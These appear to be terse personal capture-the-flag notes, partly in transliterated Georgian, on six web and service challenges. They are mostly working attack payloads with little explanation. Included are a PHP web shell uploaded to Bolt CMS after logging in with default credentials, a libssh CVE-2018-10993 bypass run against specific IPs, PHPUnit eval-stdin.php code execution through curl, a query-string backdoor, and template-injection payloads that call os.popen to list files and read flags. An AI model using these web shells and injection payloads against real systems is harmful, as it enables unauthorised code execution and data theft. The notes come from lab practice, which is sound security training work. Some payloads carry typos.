1. Bolt:

<?php echo system($_GET['cmd']);?>
Find source. For this add "view-source:" at the very start of the link.
Add /bolt/login to the link at the end, which takes you to the login screen.
Wild-guess the password, combo is admin/password. Upload this code as a .html:
<?php echo system($_GET[‘cmd’]);?>
Afterwards, rename it to php. Go into the file, and start searching. First add
cmd=id; then cmd=ls%20-l; lastly cmd=cat%20/flag.txt

2.

Elastic:msfconsole gamoikene thats it
cve 2015 5531


3. libssh:

cve 2018-10993 githubidan mygeekys iwer
python3 /home/kali/Desktop/libssh/cve-2018-10993.py  34.159.185.40 -p 32623 -c "ls /"
python3 /home/kali/Desktop/libssh/cve-2018-10993.py  34.159.185.40 -p 32623 -c "cat / flag.txt"


4. php unit:

dirsearach usage. lurji chaketili direktoriebi ver shevalt. /composer.json -> version number
mwvane-gvawkobs ra egenia gia.

Use the following:
/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
the command: curl -X POST
35.242.218.207:32111//vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php --data
"<?php system('ls -la');?>"      php 5.6.2

Use dirsearch:
./dirsearch.py -u http://url -w ./db/dicc.txt
Find composer.json, realise that the version 5.6.2 is vulnerable to code injection
Open Burp, use code injection to run:
<?php system('cat/flag.txt')?>

5. non diff backdoor:

A backdoor in pentesting is a covert method used to bypass normal authentication, providing unauthorized, persistent remote access to a system, application, or network.

view-source:http://34.185.185.43:31753/?welldone=knockknock&shazam=cat%20flag.php -amoxsna
unzip backup.zip -d backup                            grep -r "shell_exec"


6. shark: 
burpit vamowmebt server aris Server: Werkzeug/2.0.3 Python/3.6.9   reflected xss mushaobs.
ssti vcadot server side template injection when the server runs your input as code instead of showing it as text
${7*7}=gamoqvs 49

${__import__('os').popen('ls').read()}
${__import__('os').popen('cat flag').read()}
${__import('os').popen('ls').read()}
